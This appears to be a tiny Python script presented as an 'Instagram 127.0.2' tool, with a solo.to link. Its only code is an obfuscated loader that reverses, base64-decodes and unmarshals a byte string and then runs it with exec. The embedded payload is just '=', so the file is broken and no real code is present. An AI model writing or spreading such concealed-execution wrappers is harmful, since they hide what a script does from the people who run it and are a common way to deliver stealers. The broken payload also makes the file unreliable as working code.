# Instagram 127.0.2
# https://solo.to/127.0.2
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))